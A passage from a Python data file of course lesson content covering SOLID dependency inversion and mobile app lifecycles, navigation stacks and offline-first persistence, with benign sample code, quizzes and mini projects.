                    "detail": "Passing dependencies into an object via its constructor rather than hardcoding `self.db = MySQLClient()` inside the class."
                },
                {
                    "concept": "Design Smells (Code Smells)",
                    "detail": "Warning signs of architectural decay: Fragility (breaking unrelated parts), Rigidity (hard to change), and Immobility (hard to reuse)."
                }
            ]
        },
        {
            "type": "code",
            "title": "4. Python Clean Code Implementation: Refactoring with Dependency Inversion",
            "language": "python",
            "content": (
                "from abc import ABC, abstractmethod\n\n"
                "# Abstraction (Interface)\n"
                "class NotificationService(ABC):\n"
                "    @abstractmethod\n"
                "    def send(self, recipient: str, message: str) -> None:\n"
                "        pass\n\n"
                "# Low-Level Concrete Implementations\n"
                "class EmailNotificationService(NotificationService):\n"
                "    def send(self, recipient: str, message: str) -> None:\n"
                "        print(f\"[EMAIL dispatched to {recipient}]: {message}\")\n\n"
                "class SMSNotificationService(NotificationService):\n"
                "    def send(self, recipient: str, message: str) -> None:\n"
                "        print(f\"[SMS sent to {recipient}]: {message}\")\n\n"
                "# High-Level Business Module adhering to Dependency Inversion (DIP) & OCP\n"
                "class OrderProcessor:\n"
                "    # Injects abstraction via constructor (Dependency Injection)\n"
                "    def __init__(self, notifier: NotificationService):\n"
                "        self.notifier = notifier\n"
                "        \n"
                "    def process_order(self, customer_contact: str, amount: float):\n"
                "        print(f\"Processing transaction for ${amount:.2f}...\")\n"
                "        # Business logic executed here\n"
                "        self.notifier.send(customer_contact, f\"Your order of ${amount:.2f} was successful!\")\n\n"
                "# Demonstration: Easily swap notifications without modifying OrderProcessor!\n"
                "email_processor = OrderProcessor(EmailNotificationService())\n"
                "email_processor.process_order(\"alice@example.com\", 149.99)\n\n"
                "sms_processor = OrderProcessor(SMSNotificationService())\n"
                "sms_processor.process_order(\"+1-555-0199\", 49.50)"
            ),
            "output": (
                "Processing transaction for $149.99...\n"
                "[EMAIL dispatched to alice@example.com]: Your order of $149.99 was successful!\n"
                "Processing transaction for $49.50...\n"
                "[SMS sent to +1-555-0199]: Your order of $49.50 was successful!\n"
                ">>> Swapped concrete delivery channels without touching OrderProcessor source code!"
            )
        },
        {
            "type": "line_breakdown",
            "title": "Line-by-Line Code Breakdown",
            "content": [
                {"line": "class NotificationService(ABC): @abstractmethod ...", "explanation": "Defines an abstract base class (interface) enforcing the `send` contract."},
                {"line": "def __init__(self, notifier: NotificationService):", "explanation": "Dependency Inversion in action: OrderProcessor depends upon the abstraction, not concrete email or SMS classes."},
                {"line": "self.notifier.send(...)", "explanation": "Polymorphic dispatch: resolves to whichever concrete notification service was injected at runtime."}
            ]
        },
        {
            "type": "real_world",
            "title": "5. Real-World Applications: Microservices & Framework Design",
            "content": "Modern application frameworks like Spring Boot, FastAPI, and Angular rely heavily on Dependency Inversion and Inversion of Control (IoC) containers. When unit testing a payment service, engineers inject a `MockPaymentGateway` instead of contacting real banking APIs, enabling automated test execution in milliseconds with zero network dependencies."
        },
        {
            "type": "prerequisites",
            "title": "6. Prerequisites & Prior Knowledge",
            "content": [
                "Object-Oriented Programming (classes, objects, methods, inheritance)",
                "Polymorphism and abstract base classes / interfaces"
            ]
        },
        {
            "type": "learning_path",
            "title": "7. Learning Path Progression",
            "content": {
                "beginner": "Understand Single Responsibility and avoid God Objects. Apply constructor Dependency Injection.",
                "intermediate": "Implement the Strategy Pattern for Open/Closed extension. Enforce Liskov Substitution in inheritance hierarchies.",
                "advanced": "Design domain-driven architectures using Hexagonal (Ports & Adapters) and Clean Architecture patterns."
            }
        },
        {
            "type": "practice",
            "title": "8. Practice Exercises & Self-Check",
            "content": [
                {
                    "level": "Beginner",
                    "q": "What code smell indicates that a class violates the Single Responsibility Principle (SRP)?",
                    "a": "A class that has multiple reasons to change (e.g., modifying database columns requires editing the class, changing email formatting requires editing the same class, and updating calculation algorithms edits it again)."
                },
                {
                    "level": "Intermediate",
                    "q": "How does the Open/Closed Principle (OCP) prevent regression bugs when introducing a new payment provider (e.g., Apple Pay)?",
                    "a": "Under OCP, you create a new class `ApplePayGateway` that implements `PaymentGateway` without touching existing code in `PayPalGateway` or `CreditCardGateway`. Because existing classes are untouched, you cannot introduce regression bugs into existing payment flows."
                },
                {
                    "level": "Challenge",
                    "q": "How does the Liskov Substitution Principle (LSP) relate to exception handling in derived classes?",
                    "a": "A subclass should not throw new or broader checked exceptions that the base class method does not declare, because calling code expecting the base type cannot anticipate or handle those unexpected exceptions."
                }
            ]
        },
        {
            "type": "mini_project",
            "title": "9. Hands-On Mini Project: SOLID Refactoring Challenge",
            "content": {
                "title": "Refactor a Monolithic God Object into SOLID Classes",
                "objective": "Take a single 150-line `ReportManager` class that fetches DB records, formats CSV/PDF, and prints reports, and refactor it into clean, decoupled SOLID classes.",
                "steps": [
                    "Step 1: Extract data retrieval into a `DataRepository` interface.",
                    "Step 2: Extract document generation into a `ReportFormatter` interface (implementing CSVFormatter and PDFFormatter).",
                    "Step 3: Combine them inside a `ReportService` that coordinates generation without coupling.",
                    "Step 4: Verify that adding an `HTMLFormatter` requires zero modifications to `ReportService`."
                ],
                "deliverable": "A clean, modular Python architecture demonstrating all 5 SOLID principles."
            }
        },
        {
            "type": "common_mistakes",
            "title": "10. Common Mistakes & Pitfalls",
            "content": [
                {
                    "mistake": "Over-engineering simple scripts with unnecessary interfaces and abstractions.",
                    "why": "Applying all five SOLID principles to a 10-line disposable script adds needless complexity.",
                    "fix": "Apply SOLID where code is expected to grow, evolve, and be maintained by multiple developers."
                },
                {
                    "mistake": "Creating 'fat' interfaces that force implementers to write empty `pass` methods.",
                    "why": "Violates the Interface Segregation Principle (ISP) by forcing classes to implement methods they don't use.",
                    "fix": "Break monolithic interfaces down into smaller, highly cohesive role interfaces."
                }
            ]
        },
        {
            "type": "career_relevance",
            "title": "11. Career Relevance & Industry Demand",
            "content": {
                "roles": ["Staff Software Engineer", "System Architect", "Backend Developer", "Engineering Lead"],
                "relevance": "System design and SOLID principles are evaluated in high-level architectural interview rounds at FAANG and tier-1 tech firms. It separates junior coders from senior architects.",
                "skills_applied": ["Object-Oriented Design", "SOLID Architecture", "Refactoring", "Clean Code"]
            }
        },
        {
            "type": "next_steps",
            "title": "12. Key Takeaways & Next Steps",
            "content": {
                "summary": "You have mastered the SOLID principles (SRP, OCP, LSP, ISP, DIP), Dependency Injection, and architectural clean code design.",
                "next_topic": "Course Final Assessment & System Design Fundamentals",
                "bridge": "Congratulations on completing Software Engineering & System Design! You possess the professional architectural mindset to design enterprise-grade systems."
            }
        }
    ],

    # ─── MOBILE APP DEVELOPMENT ────────────────────────────────────────────────
    ("mobile-app-development", 1, 1): [
        {
            "type": "intro",
            "title": "1. Topic Introduction: Mobile App Lifecycles & Touch Gestures",
            "content": {
                "definition": "The Mobile App Lifecycle is the sequence of states an operating system (iOS or Android) transitions a mobile application through—from launching and active foreground execution to background suspension and termination. Touch Gestures are multi-touch input interactions (taps, pans, pinches, swipes).",
                "meaning": "Unlike desktop applications that run continuously with generous memory, mobile operating systems aggressively suspend or kill background apps to conserve battery life and free RAM for incoming phone calls.",
                "importance": "Properly handling lifecycle states prevents data loss (like losing unsaved form input when the user switches apps) and prevents battery drain from unpaused background GPS or camera loops."
            }
        },
        {
            "type": "explanation",
            "title": "2. Detailed Step-by-Step Explanation: The Mobile State Machine",
            "content": (
                "Understanding the core lifecycle states across modern mobile frameworks (React Native, Flutter, Swift, Kotlin):\n\n"
                "1. The Core Lifecycle States:\n"
                "• Active / Resumed (Foreground): The app is visible on screen, running on the UI thread, and actively responding to user touch input.\n"
                "• Inactive / Paused: The app is partially obscured by a system dialog (e.g. incoming call banner, biometric Face ID prompt) or transitioning between states. User input is paused.\n"
                "• Background / Suspended: The user pressed Home or switched apps. The app is in memory but execution is paused. Unsaved state must be saved to local storage immediately!\n"
                "• Terminated / Killed: The operating system purges the app from RAM due to memory pressure or the user swiped the app away from the app switcher.\n\n"
                "2. The 60 Frames-Per-Second (FPS) Rule:\n"
                "• Smooth mobile UI animations require rendering a new frame every 16.6 milliseconds (60 FPS).\n"
                "• If long-running computations (JSON parsing, database queries, image filters) execute on the Main UI Thread, the frame rate drops below 60 FPS, causing 'jank' or triggering an Application Not Responding (ANR) crash dialog.\n"
                "• Golden Rule: Heavy work must be offloaded to background threads or Web Workers.\n\n"
                "3. Touch Gesture Ergonomics:\n"
                "• Minimum Touch Target: Mobile touch targets should be at least 48x48 dp (density-independent pixels) to prevent mis-taps from thumbs.\n"
                "• Gesture Conflict Resolution: Disambiguating horizontal swipes (carousel cards) from vertical scrolling (parent list) using gesture responder systems."
            )
        },
        {
            "type": "concepts",
            "title": "3. Core Mobile Architecture Concepts Breakdown",
            "content": [
                {
                    "concept": "Declarative UI = f(State)",
                    "detail": "In React Native, Flutter, SwiftUI, and Jetpack Compose, the UI is a pure function of state. When state changes, the framework re-computes and re-renders the visual tree."
                },
                {
                    "concept": "Density-Independent Pixels (dp/pt)",
                    "detail": "Abstract units that scale automatically across different screen resolutions (1x, 2x, 3x Retina displays) to ensure consistent physical sizing."
                },
                {
                    "concept": "Thumb Zone Ergonomics",
                    "detail": "Designing primary action buttons within easy natural reach of a user's thumb (bottom screen areas) rather than the top corners."
                },
                {
                    "concept": "State Persistence on Backgrounding",
                    "detail": "Always saving draft data to SQLite or AsyncStorage during the `onPause` or `appState === 'background'` transition before termination."
                }
            ]
        },
        {
            "type": "code",
            "title": "4. React Native Lifecycle & Gesture Handling Implementation",
            "language": "javascript",
            "content": (
                "import React, { useEffect, useState } from 'react';\n"
                "import { AppState, StyleSheet, Text, View, Pressable, Alert } from 'react-native';\n\n"
                "export default function MobileLifecycleScreen() {\n"
                "  const [appStatus, setAppStatus] = useState(AppState.currentState);\n"
                "  const [tapCount, setTapCount] = useState(0);\n\n"
                "  useEffect(() => {\n"
                "    // Subscribe to mobile operating system lifecycle transitions\n"
                "    const subscription = AppState.addEventListener('change', (nextAppState) => {\n"
                "      if (appStatus.match(/inactive|background/) && nextAppState === 'active') {\n"
                "        console.log('[LIFECYCLE]: App returned to foreground! Refreshing data...');\n"
                "      } else if (nextAppState === 'background') {\n"
                "        console.log('[LIFECYCLE]: App backgrounded! Auto-saving draft state to disk...');\n"
                "      }\n"
                "      setAppStatus(nextAppState);\n"
                "    });\n\n"
                "    return () => subscription.remove();\n"
                "  }, [appStatus]);\n\n"
                "  return (\n"
                "    <View style={styles.container}>\n"
                "      <Text style={styles.header}>App State: {appStatus}</Text>\n"
                "      {/* Ergonomic Touch Target (Minimum 48x48 dp) */}\n"
                "      <Pressable\n"
                "        style={({ pressed }) => [\n"
                "          styles.button,\n"
                "          pressed && styles.buttonPressed\n"
                "        ]}\n"
                "        onPress={() => setTapCount(c => c + 1)}\n"
                "        onLongPress={() => Alert.alert('Long Press Action', 'Resetting count!')}\n"
                "      >\n"
                "        <Text style={styles.buttonText}>Tapped: {tapCount} times</Text>\n"
                "      </Pressable>\n"
                "    </View>\n"
                "  );\n"
                "}\n\n"
                "const styles = StyleSheet.create({\n"
                "  container: { flex: 1, justifyContent: 'center', alignItems: 'center' },\n"
                "  header: { fontSize: 18, fontWeight: 'bold', marginBottom: 20 },\n"
                "  button: { minWidth: 160, minHeight: 48, backgroundColor: '#4F46E5', borderRadius: 12, justifyContent: 'center', alignItems: 'center' },\n"
                "  buttonPressed: { opacity: 0.8, transform: [{ scale: 0.98 }] },\n"
                "  buttonText: { color: '#FFFFFF', fontWeight: 'bold' }\n"
                "});"
            ),
            "output": (
                "[LIFECYCLE]: App state initialized: active\n"
                ">>> State: active | Rendered 48x48dp touch button responding to tap and longPress."
            )
        },
        {
            "type": "line_breakdown",
            "title": "Line-by-Line Code Breakdown",
            "content": [
                {"line": "AppState.addEventListener('change', ...)", "explanation": "Listens directly to native iOS and Android OS lifecycle state changes."},
                {"line": "if (nextAppState === 'background')", "explanation": "Detects when the user leaves the app, triggering auto-saving of drafts before OS termination."},
                {"line": "minHeight: 48, minWidth: 160", "explanation": "Ensures interactive touch targets meet Google Material and Apple Human Interface minimum size guidelines."},
                {"line": "onLongPress={() => ...}", "explanation": "Handles complex multi-touch duration gestures alongside standard instant tap events."}
            ]
        },
        {
            "type": "real_world",
            "title": "5. Real-World Applications: Uber Driver App & Instagram Feed",
            "content": "Ride-sharing apps like Uber and Lyft manage background geolocation lifecycles. When a driver switches to Google Maps, the app transitions into background mode with an active foreground background-service notification, continuing to transmit GPS coordinates without the OS terminating the connection."
        },
        {
            "type": "prerequisites",
            "title": "6. Prerequisites & Prior Knowledge",
            "content": [
                "JavaScript/TypeScript or Dart/Kotlin fundamentals",
                "Basic understanding of UI layouts and event handlers",
                "Mobile screen dimensions and touch interactions"
            ]
        },
        {
            "type": "learning_path",
            "title": "7. Learning Path Progression",
            "content": {
                "beginner": "Build basic mobile layouts with Flexbox and handle button taps and text input.",
                "intermediate": "Manage AppState lifecycle transitions, implement pull-to-refresh, and handle swipe gestures.",
                "advanced": "Build high-performance 60fps animations with React Native Reanimated, handle hardware sensors, and optimize memory footprints."
            }
        },
        {
            "type": "practice",
            "title": "8. Practice Exercises & Self-Check",
            "content": [
                {
                    "level": "Beginner",
                    "q": "What is the recommended minimum touch target size for mobile UI interactive elements, and why?",
                    "a": "At least 48x48 dp (density-independent pixels) on Android (or 44x44 pt on iOS). Smaller targets cause thumb mis-taps and frustrate users."
                },
                {
                    "level": "Intermediate",
                    "q": "Why should intensive operations like resizing 4K images or running heavy JSON parsing never run on the mobile UI thread?",
                    "a": "The UI thread is responsible for handling touch inputs and rendering frames at 60 FPS (every 16.6ms). Blocking this thread drops frames, freezes the screen, and triggers an Application Not Responding (ANR) crash."
                },
                {
                    "level": "Challenge",
                    "q": "What happens to in-memory state variables if a mobile app is in the background and the operating system encounters extreme memory pressure?",
                    "a": "The mobile OS terminates (kills) the app process silently without warning. If data was not persisted to disk (SQLite or AsyncStorage) during the background transition, all in-memory state is permanently lost."
                }
            ]
        },
        {
            "type": "mini_project",
            "title": "9. Hands-On Mini Project: Auto-Saving Form with Lifecycle Listener",
            "content": {
                "title": "Build an Auto-Saving Note Editor on Backgrounding",
                "objective": "Build a mobile component where text entered in a note draft is automatically flushed and saved to local storage the instant `AppState` changes to `background`.",
                "steps": [
                    "Step 1: Create a text input component bound to state.",
                    "Step 2: Add `AppState` event listener detecting background transitions.",
                    "Step 3: Save the note payload to local storage on transition.",
                    "Step 4: Restore draft text when the app re-mounts."
                ],
                "deliverable": "A mobile note editor that never loses data even if the app is abruptly closed."
            }
        },
        {
            "type": "common_mistakes",
            "title": "10. Common Mistakes & Pitfalls",
            "content": [
                {
                    "mistake": "Relying on component unmount (`useEffect` cleanup) to save state on app close.",
                    "why": "When the operating system terminates a background app, component unmount hooks do NOT run.",
                    "fix": "Always save critical state during the `AppState === 'background'` transition."
                },
                {
                    "mistake": "Placing interactive buttons inside the phone's physical hardware notch or home bar area.",
                    "why": "Renders controls unclickable behind device display cutouts or gestures.",
                    "fix": "Always wrap root mobile views in a `SafeAreaView` or `SafeAreaProvider`."
                }
            ]
        },
        {
            "type": "career_relevance",
            "title": "11. Career Relevance & Industry Demand",
            "content": {
                "roles": ["Mobile App Developer (React Native / Flutter)", "iOS Developer (Swift)", "Android Developer (Kotlin)", "Frontend Mobile Engineer"],
                "relevance": "Over 60% of all global web traffic originates from mobile devices. Native performance, gesture responsiveness, and lifecycle reliability are tested in mobile technical interviews.",
                "skills_applied": ["Mobile Lifecycle", "Gesture Handling", "Responsive Mobile Layouts", "Battery & Memory Optimization"]
            }
        },
        {
            "type": "next_steps",
            "title": "12. Key Takeaways & Next Steps",
            "content": {
                "summary": "You have mastered Mobile App Lifecycles (active, background, terminated), 60 FPS UI thread constraints, and touch gesture ergonomics.",
                "next_topic": "Screen Navigation Stacks and Offline Persistence",
                "bridge": "Now that you understand single-screen lifecycles, we examine multi-screen routing with Navigation Stacks and local database persistence."
            }
        }
    ],

    ("mobile-app-development", 2, 1): [
        {
            "type": "intro",
            "title": "1. Topic Introduction: Screen Navigation Stacks & Offline Persistence",
            "content": {
                "definition": "Screen Navigation Stacks manage hierarchical transitions between screens using a Last-In, First-Out (LIFO) stack model. Offline Persistence is the architectural capability of a mobile application to cache data locally in an embedded database (like SQLite or MMKV) so the app remains fully functional without an internet connection.",
                "meaning": "When navigating deeper into an app (Feed → Post Details → Comments), new screens are 'pushed' onto the navigation stack. Pressing Back 'pops' the top screen off. Offline persistence ensures users see cached data immediately instead of a blank loading spinner.",
                "importance": "Mobile networks are inherently unreliable (subways, rural areas, elevators). Apps built with an 'offline-first' architecture deliver instantaneous load times and sync seamlessly once connectivity is restored."
            }
        },
        {
            "type": "explanation",
            "title": "2. Detailed Step-by-Step Explanation: Stacks, Tabs & Local Storage",
            "content": (
                "The core paradigms of mobile routing and offline-first storage:\n\n"
                "1. Mobile Navigation Paradigms:\n"
                "• Stack Navigation: Manages hierarchical drilling (e.g. Profile -> Edit Settings). Pushing a screen transitions right-to-left; popping transitions left-to-right with a native Back button.\n"
                "• Bottom Tab Navigation: Manages 3-5 top-level destination peers (e.g., Home, Search, Notifications, Profile) positioned at the bottom of the screen for thumb reach.\n"
                "• Drawer Navigation: A side-sliding panel used for secondary links and settings on tablets and enterprise apps.\n\n"
                "2. Offline-First Storage Options:\n"
                "• Key-Value Stores (AsyncStorage / MMKV): Best for lightweight preferences, theme toggles, and JWT auth tokens. Synchronous MMKV operates via memory-mapped files (100x faster than traditional storage).\n"
                "• Embedded Relational Databases (SQLite / Room / Core Data): Essential for storing thousands of structured entities (e.g., cached messages, offline products, complex relational queries).\n\n"
                "3. The Cache-Then-Network Strategy:\n"
                "• Step 1: When a screen loads, immediately query local SQLite and render cached data on screen (0ms latency).\n"
                "• Step 2: Concurrently fire a background HTTP request to fetch fresh data from the API.\n"
                "• Step 3: When the network response arrives, update the SQLite database and seamlessly update the UI."
            )
        },
        {
            "type": "concepts",
            "title": "3. Core Navigation & Persistence Concepts Breakdown",
            "content": [
                {
                    "concept": "LIFO Stack Routing",
                    "detail": "Screens are pushed and popped in Last-In First-Out order, preserving navigation history and enabling intuitive Android hardware back button behavior."
                },
                {
                    "concept": "Cache-Then-Network Pattern",
                    "detail": "Eliminates empty white screens by displaying local cached state immediately while refreshing data in the background."
                },
                {
                    "concept": "Optimistic UI Updates",
                    "detail": "Updating the local UI immediately when a user acts (e.g., clicking 'Like'), then syncing with the server in the background and rolling back if the request fails."
                },
                {
                    "concept": "Network State Synchronization",
                    "detail": "Listening to network connectivity (NetInfo) to queue offline actions (like sending messages) and dispatching them when Wi-Fi/Cellular reconnects."
                }
            ]
        },
        {
            "type": "code",
            "title": "4. Complete Offline-First Mobile Service Implementation",
            "language": "javascript",
            "content": (
                "// Offline-First Cache-Then-Network Data Service\n"
                "class OfflineFeedService {\n"
                "  constructor() {\n"
                "    this.localCache = new Map(); // Simulating embedded local database (SQLite/MMKV)\n"
                "  }\n\n"
                "  // Retrieve cached articles with 0ms latency\n"
                "  getCachedFeed() {\n"
                "    const cached = this.localCache.get('feed_articles');\n"
                "    return cached || [{ id: 101, title: 'Cached Article (Offline Ready)', author: 'System' }];\n"
                "  }\n\n"
                "  // Fetch fresh data and update local storage\n"
                "  async syncWithNetwork(apiEndpoint) {\n"
                "    try {\n"
                "      // Simulate network request\n"
                "      const freshData = [\n"
                "        { id: 101, title: 'Updated Article v2', author: 'Cloud Sync' },\n"
                "        { id: 102, title: 'Breaking Mobile News', author: 'Tech Editorial' }\n"
                "      ];\n"
                "      // Persist to local cache\n"
                "      this.localCache.set('feed_articles', freshData);\n"
                "      return { success: true, data: freshData, source: 'network' };\n"
                "    } catch (err) {\n"
                "      // Network failure: graceful fallback to local cache\n"
                "      return { success: false, data: this.getCachedFeed(), source: 'cache_fallback' };\n"
                "    }\n"
                "  }\n"
                "}\n\n"
                "// Test execution\n"
                "const feedService = new OfflineFeedService();\n"
                "console.log(\"1. Instant Screen Render (Cache):\", feedService.getCachedFeed());\n\n"
                "feedService.syncWithNetwork('https://api.myapp.com/feed').then(res => {\n"
                "  console.log(\"2. Background Network Sync:\", res);\n"
                "});"
            ),
            "output": (
                "1. Instant Screen Render (Cache): [ { id: 101, title: 'Cached Article (Offline Ready)', author: 'System' } ]\n"
                "2. Background Network Sync: { success: true, data: [ { id: 101, title: 'Updated Article v2', author: 'Cloud Sync' }, { id: 102, title: 'Breaking Mobile News', author: 'Tech Editorial' } ], source: 'network' }\n"
                ">>> Instant zero-delay cached render followed by seamless background network sync."
            )
        },
        {
            "type": "line_breakdown",
            "title": "Line-by-Line Code Breakdown",
            "content": [
                {"line": "getCachedFeed()", "explanation": "Returns locally persisted data synchronously with zero network latency."},
                {"line": "await syncWithNetwork(...)", "explanation": "Asynchronously fetches fresh data from remote REST/GraphQL API without blocking UI."},
                {"line": "this.localCache.set('feed_articles', freshData)", "explanation": "Overwrites local SQLite/MMKV cache with latest records for subsequent offline launches."},
                {"line": "catch (err) { return this.getCachedFeed() }", "explanation": "Ensures the app never displays an error screen when the device is in airplane mode."}
            ]
        },
        {
            "type": "real_world",
            "title": "5. Real-World Applications: WhatsApp, Spotify & Pocket Casts",
            "content": "Messaging apps like WhatsApp and music players like Spotify are completely offline-first. When you send a WhatsApp message in an airplane, the app immediately adds the message to your chat UI and saves it to local SQLite with a single clock icon. As soon as you land and reconnect to cell service, a background synchronization queue automatically delivers the message."
        },
        {
            "type": "prerequisites",
            "title": "6. Prerequisites & Prior Knowledge",
            "content": [
                "Mobile App Lifecycle understanding",
                "Asynchronous programming (Promises, async/await)",
                "Basic understanding of client-side caching"
            ]
        },
        {
            "type": "learning_path",
            "title": "7. Learning Path Progression",
            "content": {
                "beginner": "Configure Stack and Bottom Tab navigators in React Navigation or Flutter. Store user tokens in AsyncStorage.",
                "intermediate": "Implement Cache-Then-Network patterns, manage deep linking, and handle hardware back buttons.",
                "advanced": "Build bidirectional offline sync with conflict resolution using SQLite (WatermelonDB, Realm) and background workers."
            }
        },
        {
            "type": "practice",
            "title": "8. Practice Exercises & Self-Check",
            "content": [
                {
                    "level": "Beginner",
                    "q": "What is the difference between navigating with `navigation.navigate('Details')` versus `navigation.push('Details')` in React Navigation?",
                    "a": "`navigate('Details')` moves to an existing instance of Details if it is already in the stack; `push('Details')` always creates and pushes a brand new instance of Details onto the stack (essential for recursive flows like viewing related products)."
                },
                {
                    "level": "Intermediate",
                    "q": "What is an 'Optimistic UI Update', and why is it essential for mobile user experience?",
                    "a": "An optimistic update updates the UI immediately assuming the server request will succeed (e.g. toggling a Heart icon instantly). The user feels zero latency, while the actual API request completes in the background. If the request fails, the UI rolls back."
                },
                {
                    "level": "Challenge",
                    "q": "How do you handle data conflicts when multiple offline edits are synced to the cloud after reconnecting?",
                    "a": "Using conflict resolution strategies: Last-Write-Wins (LWW) based on timestamps, or Conflict-Free Replicated Data Types (CRDTs) where operations commute and merge deterministically."
                }
            ]
        },
        {
            "type": "mini_project",
            "title": "9. Hands-On Mini Project: Stack-Based Offline Reading App",
            "content": {
                "title": "Build a Multi-Screen Offline Article Reader",
                "objective": "Build a 2-screen navigation flow (Feed Screen and Detail Screen) that caches clicked articles locally and enables offline reading.",
                "steps": [
                    "Step 1: Set up a Stack Navigator with `Feed` and `ArticleDetail` screens.",
                    "Step 2: Implement article selection pushing the detail screen with route params.",
                    "Step 3: Cache fetched article text to local storage.",
                    "Step 4: Verify that opening the detail screen works flawlessly in Airplane mode."
                ],
                "deliverable": "A working mobile navigation flow supporting offline reading."
            }
        },
        {
            "type": "common_mistakes",
            "title": "10. Common Mistakes & Pitfalls",
            "content": [
                {
                    "mistake": "Displaying a full-screen loading spinner every time a screen opens.",
                    "why": "Forces users to wait 1-2 seconds on every screen transition even when data has not changed.",
                    "fix": "Use Cache-Then-Network: display cached data immediately while refreshing in the background."
                },
                {
                    "mistake": "Storing large datasets (hundreds of images or thousands of rows) in AsyncStorage.",
                    "why": "AsyncStorage is unindexed and loads all keys into memory, causing severe memory spikes.",
                    "fix": "Use an embedded relational database (SQLite) for datasets with more than a few hundred rows."
                }
            ]
        },
        {
            "type": "career_relevance",
            "title": "11. Career Relevance & Industry Demand",
            "content": {
                "roles": ["Senior Mobile Engineer", "React Native Developer", "Offline-First Architect", "Mobile Product Engineer"],
                "relevance": "Offline architecture and navigation state management are standard topics in senior mobile system design interviews.",
                "skills_applied": ["Mobile Navigation Stacks", "Offline Persistence", "Cache-Then-Network", "Optimistic UI"]
            }
        },
        {
            "type": "next_steps",
            "title": "12. Key Takeaways & Next Steps",
            "content": {
                "summary": "You have mastered Mobile Navigation Stacks, Tab Bars, Offline-First architecture, Cache-Then-Network strategies, and local database persistence.",
                "next_topic": "Course Final Assessment & Native Mobile Production Deployments",
                "bridge": "Congratulations on completing Mobile App Development! You possess the mobile architecture and local persistence skills required to build production mobile apps."
            }
        }
    ]
}
